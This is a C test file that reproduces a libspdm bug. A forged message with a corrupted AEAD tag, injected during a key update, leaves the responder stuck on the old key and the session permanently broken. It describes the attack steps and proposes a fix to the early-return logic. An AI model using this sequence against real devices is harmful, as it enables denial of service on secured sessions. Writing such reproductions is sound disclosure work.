/**
 * test_bug1_rollback_commit_asymmetry.c
 *
 * BUG-F2-MC1 Reproduction: Key Mismatch After Requester Commit Point
 *
 * Root cause:
 *   libspdm_rsp_receive_send.c:232 returns an error WITHOUT executing the
 *   reset_key_update block at line 249 when both the new-key decode AND the
 *   old-key (backup) retry fail. This leaves the responder with the old epoch
 *   key, backup_valid=false, and no path to recover — permanently desynced from
 *   the requester which has already committed to the new key.
 *
 * Escalation level: Level 2 (direct state injection via create_update/activate_update)
 *
 * Compile:
 *   See Makefile or the build instructions in repro/README.
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdbool.h>

/* Pull in the internal secured-message context layout */
#include "hal/base.h"
#include "hal/library/memlib.h"
#include "internal/libspdm_secured_message_lib.h"

/* ------------------------------------------------------------------ */
/* Callbacks                                                            */
/* ------------------------------------------------------------------ */

static uint8_t get_seq_num(uint64_t seq, uint8_t *buf)
{
    memcpy(buf, &seq, 8);
    return 8;
}

static uint32_t get_max_rand(void) { return 0; }

static spdm_version_number_t get_spdm_ver(spdm_version_number_t v)
{
    (void)v;
    return SECURED_SPDM_VERSION_11;
}

static libspdm_secured_message_callbacks_t g_cbs = {
    .version                     = LIBSPDM_SECURED_MESSAGE_CALLBACKS_VERSION,
    .get_secured_spdm_version    = get_spdm_ver,
    .get_max_random_number_count = get_max_rand,
    .get_sequence_number         = get_seq_num,
};

/* ------------------------------------------------------------------ */
/* Context initializer: both sides share the same epoch-0 key material */
/* ------------------------------------------------------------------ */

static void init_smc(libspdm_secured_message_context_t *smc)
{
    memset(smc, 0, sizeof(*smc));
    smc->secured_message_version     = SECURED_SPDM_VERSION_11;
    smc->aead_cipher_suite            = SPDM_ALGORITHMS_AEAD_CIPHER_SUITE_AES_256_GCM;
    smc->session_type                 = LIBSPDM_SESSION_TYPE_ENC_MAC;
    smc->session_state                = LIBSPDM_SESSION_STATE_ESTABLISHED;
    smc->aead_tag_size                = 16;
    smc->aead_key_size                = 32;
    smc->aead_iv_size                 = 12;
    smc->max_spdm_session_sequence_number = UINT64_MAX;
    smc->sequence_number_endian = LIBSPDM_DATA_SESSION_SEQ_NUM_ENC_LITTLE_DEC_BOTH;
    smc->base_hash_algo = SPDM_ALGORITHMS_BASE_HASH_ALGO_TPM_ALG_SHA_256;
    smc->hash_size = 32;  /* SHA-256 digest size — required by create_update */
    smc->version = SPDM_MESSAGE_VERSION_11 << SPDM_VERSION_NUMBER_SHIFT_BIT;

    /* Known epoch-0 request key/salt */
    static const uint8_t REQ_KEY[32] = {
        0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,
        0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,0x10,
        0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,
        0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20 };
    static const uint8_t REQ_SALT[12] = {
        0xa1,0xa2,0xa3,0xa4,0xa5,0xa6,0xa7,0xa8,0xa9,0xaa,0xab,0xac };
    static const uint8_t RSP_KEY[32] = {
        0x21,0x22,0x23,0x24,0x25,0x26,0x27,0x28,
        0x29,0x2a,0x2b,0x2c,0x2d,0x2e,0x2f,0x30,
        0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,
        0x39,0x3a,0x3b,0x3c,0x3d,0x3e,0x3f,0x40 };
    static const uint8_t RSP_SALT[12] = {
        0xb1,0xb2,0xb3,0xb4,0xb5,0xb6,0xb7,0xb8,0xb9,0xba,0xbb,0xbc };
    /* Known epoch-0 secrets — same on both sides so HKDF derives same epoch-1 key */
    static const uint8_t REQ_SECRET[32] = {
        0xc1,0xc2,0xc3,0xc4,0xc5,0xc6,0xc7,0xc8,
        0xc9,0xca,0xcb,0xcc,0xcd,0xce,0xcf,0xd0,
        0xd1,0xd2,0xd3,0xd4,0xd5,0xd6,0xd7,0xd8,
        0xd9,0xda,0xdb,0xdc,0xdd,0xde,0xdf,0xe0 };
    static const uint8_t RSP_SECRET[32] = {
        0xe1,0xe2,0xe3,0xe4,0xe5,0xe6,0xe7,0xe8,
        0xe9,0xea,0xeb,0xec,0xed,0xee,0xef,0xf0,
        0xf1,0xf2,0xf3,0xf4,0xf5,0xf6,0xf7,0xf8,
        0xf9,0xfa,0xfb,0xfc,0xfd,0xfe,0xff,0x00 };

    memcpy(smc->application_secret.request_data_encryption_key, REQ_KEY, 32);
    memcpy(smc->application_secret.request_data_salt, REQ_SALT, 12);
    memcpy(smc->application_secret.response_data_encryption_key, RSP_KEY, 32);
    memcpy(smc->application_secret.response_data_salt, RSP_SALT, 12);
    memcpy(smc->application_secret.request_data_secret, REQ_SECRET, 32);
    memcpy(smc->application_secret.response_data_secret, RSP_SECRET, 32);
}

/* ------------------------------------------------------------------ */
/* Helpers                                                              */
/* ------------------------------------------------------------------ */

static int passed = 0;
static int failed = 0;

#define CHECK(cond, msg) do {                                  \
    if (cond) { printf("  PASS: %s\n", msg); passed++; }      \
    else       { printf("  FAIL: %s\n", msg); failed++;  }    \
} while (0)

static void print_key_summary(const char *label,
                               const libspdm_secured_message_context_t *smc)
{
    printf("  %-6s: backup_valid=%d  req_key[0]=0x%02x  req_seq=%llu\n",
           label,
           (int)smc->requester_backup_valid,
           smc->application_secret.request_data_encryption_key[0],
           (unsigned long long)smc->application_secret.request_data_sequence_number);
}

/* ------------------------------------------------------------------ */
/* Main                                                                 */
/* ------------------------------------------------------------------ */

int main(void)
{
    const uint32_t SESSION_ID = 0xDEADBEEF;

    libspdm_secured_message_context_t req_smc, rsp_smc;
    libspdm_return_t status;
    bool result;

    static uint8_t g_sec_buf[0x1000];
    static uint8_t g_app_buf[0x1000];

    uint8_t plaintext[] = {0xAA, 0xBB, 0xCC, 0xDD};

    printf("=================================================================\n");
    printf("BUG-F2-MC1: Key Mismatch After Requester Commit (Rollback Safety)\n");
    printf("=================================================================\n\n");

    /* -------------------------------------------------------------- */
    /* SETUP: Both sides share epoch-0 keys.                           */
    /* -------------------------------------------------------------- */
    printf("[SETUP] Initialize requester and responder at epoch-0\n");
    init_smc(&req_smc);
    init_smc(&rsp_smc);

    /* Verify baseline: encode-then-decode round-trip works */
    size_t sec_size = sizeof(g_sec_buf);
    status = libspdm_encode_secured_message(
        &req_smc, SESSION_ID, /*is_request=*/true,
        sizeof(plaintext), plaintext,
        &sec_size, g_sec_buf, &g_cbs);
    if (status != LIBSPDM_STATUS_SUCCESS) {
        printf("ABORT: baseline encode failed (0x%08x)\n", status);
        return 2;
    }
    size_t app_size = sizeof(g_app_buf);
    void  *app_ptr  = g_app_buf;
    status = libspdm_decode_secured_message(
        &rsp_smc, SESSION_ID, /*is_request=*/true,
        sec_size, g_sec_buf, &app_size, &app_ptr, &g_cbs);
    if (status != LIBSPDM_STATUS_SUCCESS) {
        printf("ABORT: baseline decode failed (0x%08x)\n", status);
        return 2;
    }
    printf("  Baseline encode/decode at epoch-0: OK\n\n");

    /* -------------------------------------------------------------- */
    /* STEP 1: Key Update Protocol begins.                             */
    /*   Requester sends KEY_UPDATE, responder calls create_update.   */
    /* -------------------------------------------------------------- */
    printf("[STEP 1] Responder receives KEY_UPDATE → create_update(REQUESTER)\n");

    result = libspdm_create_update_session_data_key(
        &rsp_smc, LIBSPDM_KEY_UPDATE_ACTION_REQUESTER);
    if (!result) { printf("ABORT: create_update failed\n"); return 2; }

    printf("  After create_update:\n");
    print_key_summary("rsp", &rsp_smc);
    printf("  rsp: backup_key[0]=0x%02x  backup_seq=%llu\n",
           rsp_smc.application_secret_backup.request_data_encryption_key[0],
           (unsigned long long)rsp_smc.application_secret_backup.request_data_sequence_number);
    CHECK(rsp_smc.requester_backup_valid, "rsp.backup_valid=true after create_update");
    printf("\n");

    /* -------------------------------------------------------------- */
    /* STEP 2: Requester receives KEY_UPDATE_ACK → commits to new key. */
    /*   Requester calls create_update + activate(new) — no rollback. */
    /* -------------------------------------------------------------- */
    printf("[STEP 2] Requester receives KEY_UPDATE_ACK → commit to new key\n");

    result = libspdm_create_update_session_data_key(
        &req_smc, LIBSPDM_KEY_UPDATE_ACTION_REQUESTER);
    if (!result) { printf("ABORT: req create_update failed\n"); return 2; }

    result = libspdm_activate_update_session_data_key(
        &req_smc, LIBSPDM_KEY_UPDATE_ACTION_REQUESTER, /*use_new_key=*/true);
    if (!result) { printf("ABORT: req activate failed\n"); return 2; }

    printf("  After commit:\n");
    print_key_summary("req", &req_smc);
    CHECK(!req_smc.requester_backup_valid,
          "req.backup_valid=false (committed, irrevocable)");
    printf("  KEY UPDATE WINDOW OPEN: req at epoch-1, rsp at epoch-1 (backup epoch-0 valid)\n\n");

    /* Save epoch-0 key for comparison */
    uint8_t epoch0_key_byte0 = rsp_smc.application_secret_backup.request_data_encryption_key[0];
    uint8_t epoch1_key_byte0 = rsp_smc.application_secret.request_data_encryption_key[0];
    printf("  epoch-0 key[0]=0x%02x, epoch-1 key[0]=0x%02x\n\n",
           epoch0_key_byte0, epoch1_key_byte0);

    /* -------------------------------------------------------------- */
    /* STEP 3: Attacker crafts a forged message.                       */
    /*   Encodes with epoch-1 key then corrupts AEAD tag → fails AEAD */
    /*   with BOTH new key AND old (backup) key.                      */
    /* -------------------------------------------------------------- */
    printf("[STEP 3] Craft forged message (epoch-1 encoded, AEAD tag corrupted)\n");

    /* req_smc is already at epoch-1; reset seq to match rsp's expected seq=0 */
    req_smc.application_secret.request_data_sequence_number = 0;
    rsp_smc.application_secret.request_data_sequence_number = 0;

    sec_size = sizeof(g_sec_buf);
    status = libspdm_encode_secured_message(
        &req_smc, SESSION_ID, true,
        sizeof(plaintext), plaintext,
        &sec_size, g_sec_buf, &g_cbs);
    if (status != LIBSPDM_STATUS_SUCCESS) {
        printf("ABORT: forged-msg encode failed (0x%08x)\n", status);
        return 2;
    }
    /* Flip every bit of the AEAD tag (last 16 bytes) */
    for (int i = 0; i < 16; i++)
        g_sec_buf[sec_size - 16 + i] ^= 0xFF;
    printf("  Forged message: %zu bytes, AEAD tag XOR-flipped\n", sec_size);
    printf("  → will fail AEAD with epoch-1 key (wrong tag)\n");
    printf("  → will fail AEAD with epoch-0 key (wrong key AND wrong tag)\n\n");

    /* Reset seq counters (encode incremented them; we need seq=0 for decode) */
    req_smc.application_secret.request_data_sequence_number = 0;
    rsp_smc.application_secret.request_data_sequence_number = 0;

    /* -------------------------------------------------------------- */
    /* STEP 4: Simulate libspdm_rsp_receive_send.c TRY_DISCARD path.  */
    /*   4a. Decode with epoch-1 key → TRY_DISCARD (backup_valid=true)*/
    /* -------------------------------------------------------------- */
    printf("[STEP 4a] Responder decodes forged msg with epoch-1 key\n");
    app_size = sizeof(g_app_buf);
    app_ptr  = g_app_buf;
    status = libspdm_decode_secured_message(
        &rsp_smc, SESSION_ID, true,
        sec_size, g_sec_buf, &app_size, &app_ptr, &g_cbs);
    printf("  decode result: 0x%08x\n", status);
    CHECK(status == LIBSPDM_STATUS_SESSION_TRY_DISCARD_KEY_UPDATE,
          "TRY_DISCARD returned because backup_valid=true and AEAD failed");
    printf("\n");

    /* -------------------------------------------------------------- */
    /* STEP 4b: rsp_receive_send.c line 209: activate_update(false)   */
    /*   = rollback to old epoch-0 key; backup cleared.               */
    /* -------------------------------------------------------------- */
    printf("[STEP 4b] rsp_receive_send.c:209 → activate_update(REQUESTER, false)\n");
    result = libspdm_activate_update_session_data_key(
        &rsp_smc, LIBSPDM_KEY_UPDATE_ACTION_REQUESTER, /*use_new_key=*/false);
    if (!result) { printf("ABORT: rollback activate failed\n"); return 2; }

    printf("  After rollback:\n");
    print_key_summary("rsp", &rsp_smc);
    CHECK(!rsp_smc.requester_backup_valid,
          "rsp.backup_valid=false (backup cleared by activate_update)");
    CHECK(rsp_smc.application_secret.request_data_encryption_key[0] == epoch0_key_byte0,
          "rsp.req_key[0] == epoch-0 value (old key restored)");
    printf("\n");

    /* -------------------------------------------------------------- */
    /* STEP 4c: rsp_receive_send.c line 224: retry decode with old key */
    /*   Forged message → AEAD also fails with old key.               */
    /* -------------------------------------------------------------- */
    printf("[STEP 4c] rsp_receive_send.c:224 → retry decode with epoch-0 key\n");
    /* Restore seq to backup value (0) for the retry */
    rsp_smc.application_secret.request_data_sequence_number = 0;
    app_size = sizeof(g_app_buf);
    app_ptr  = g_app_buf;
    libspdm_return_t retry_status = libspdm_decode_secured_message(
        &rsp_smc, SESSION_ID, true,
        sec_size, g_sec_buf, &app_size, &app_ptr, &g_cbs);
    printf("  retry result: 0x%08x (expect error — forged AEAD tag)\n", retry_status);
    CHECK(LIBSPDM_STATUS_IS_ERROR(retry_status),
          "Retry decode also fails (forged tag fails old key too)");
    /* Because backup_valid=false after rollback, this returns a plain error,
     * NOT TRY_DISCARD — no further recovery possible */
    CHECK(retry_status != LIBSPDM_STATUS_SESSION_TRY_DISCARD_KEY_UPDATE,
          "No TRY_DISCARD on retry (backup_valid=false, no further rollback)");
    printf("\n");

    /* -------------------------------------------------------------- */
    /* BUG: rsp_receive_send.c line 232 returns early.                */
    /*   reset_key_update block (line 249) is NEVER reached.          */
    /*   create_update_session_data_key is NOT called.                 */
    /*   The session is left with epoch-0 key, no backup, no recovery. */
    /* -------------------------------------------------------------- */
    printf("[BUG] rsp_receive_send.c:232 returns error — reset_key_update block skipped\n");
    printf("  (In the real code: 'if (LIBSPDM_STATUS_IS_ERROR(status)) return status;')\n");
    printf("  (The 'if (reset_key_update) create_update(...)' at line 249 is NOT reached)\n\n");

    /* -------------------------------------------------------------- */
    /* STEP 5: Verify the broken post-state.                          */
    /* -------------------------------------------------------------- */
    printf("[STEP 5] Post-attack state verification\n");
    printf("  Responder state:\n");
    print_key_summary("rsp", &rsp_smc);
    printf("  Requester state:\n");
    print_key_summary("req", &req_smc);

    CHECK(!rsp_smc.requester_backup_valid,
          "rsp.backup_valid=false → NO recovery path available");
    CHECK(rsp_smc.application_secret.request_data_encryption_key[0] == epoch0_key_byte0,
          "rsp uses epoch-0 key (rolled back, never re-created)");
    CHECK(!req_smc.requester_backup_valid,
          "req.backup_valid=false (committed at step 2)");
    CHECK(req_smc.application_secret.request_data_encryption_key[0] != epoch0_key_byte0,
          "req uses epoch-1 key (different from responder)");
    CHECK(req_smc.application_secret.request_data_encryption_key[0] == epoch1_key_byte0,
          "req uses epoch-1 key (confirmed)");
    printf("\n");

    /* -------------------------------------------------------------- */
    /* STEP 6: Demonstrate session is permanently broken.             */
    /*   Requester sends VERIFY_NEW_KEY (epoch-1); responder cannot   */
    /*   decode it.                                                    */
    /* -------------------------------------------------------------- */
    printf("[STEP 6] Session liveness test: requester sends with epoch-1 key\n");

    /* Requester sends at seq=0 with epoch-1 key */
    req_smc.application_secret.request_data_sequence_number  = 0;
    rsp_smc.application_secret.request_data_sequence_number  = 0;

    sec_size = sizeof(g_sec_buf);
    status = libspdm_encode_secured_message(
        &req_smc, SESSION_ID, true,
        sizeof(plaintext), plaintext,
        &sec_size, g_sec_buf, &g_cbs);
    if (status != LIBSPDM_STATUS_SUCCESS) {
        printf("ABORT: VERIFY_NEW_KEY encode failed (0x%08x)\n", status);
        return 2;
    }
    printf("  Requester encoded VERIFY_NEW_KEY: %zu bytes (epoch-1, seq=0)\n", sec_size);

    app_size = sizeof(g_app_buf);
    app_ptr  = g_app_buf;
    libspdm_return_t final_status = libspdm_decode_secured_message(
        &rsp_smc, SESSION_ID, true,
        sec_size, g_sec_buf, &app_size, &app_ptr, &g_cbs);
    printf("  Responder decode result: 0x%08x\n", final_status);
    CHECK(LIBSPDM_STATUS_IS_ERROR(final_status),
          "Responder CANNOT decode VERIFY_NEW_KEY (epoch-1 msg vs epoch-0 key)");
    CHECK(final_status != LIBSPDM_STATUS_SESSION_TRY_DISCARD_KEY_UPDATE,
          "No TRY_DISCARD — backup_valid=false — session PERMANENTLY BROKEN");
    printf("\n");

    /* -------------------------------------------------------------- */
    /* SUMMARY                                                          */
    /* -------------------------------------------------------------- */
    printf("=================================================================\n");
    printf("SUMMARY\n");
    printf("=================================================================\n");
    printf("Tests passed: %d\n", passed);
    printf("Tests failed: %d\n", failed);
    printf("\n");
    if (failed == 0) {
        printf("STATUS: BUG CONFIRMED\n\n");
        printf("The attack sequence successfully leaves the session permanently broken:\n");
        printf("  1. Attacker injects forged message during key-update window\n");
        printf("  2. Both decode attempts fail (new key + old key)\n");
        printf("  3. rsp_receive_send.c returns early (line 232) without re-creating\n");
        printf("     the new session key (the reset_key_update block at line 249 is skipped)\n");
        printf("  4. Responder stuck at epoch-0, backup_valid=false\n");
        printf("  5. Requester at epoch-1, backup_valid=false (committed)\n");
        printf("  6. All subsequent messages fail AEAD — no recovery mechanism\n\n");
        printf("ROOT CAUSE:\n");
        printf("  library/spdm_responder_lib/libspdm_rsp_receive_send.c:232\n");
        printf("  The 'if (LIBSPDM_STATUS_IS_ERROR(status)) return status;' guard\n");
        printf("  exits before the 'if (reset_key_update) create_update_session_data_key()'\n");
        printf("  block at line 249, which is only reached on successful retry.\n");
        printf("  Fix: execute the reset_key_update block unconditionally when\n");
        printf("  reset_key_update=true, regardless of the retry decode status.\n");
    } else {
        printf("STATUS: REPRODUCTION INCONCLUSIVE (%d assertions failed)\n", failed);
    }

    return (failed > 0) ? 1 : 0;
}
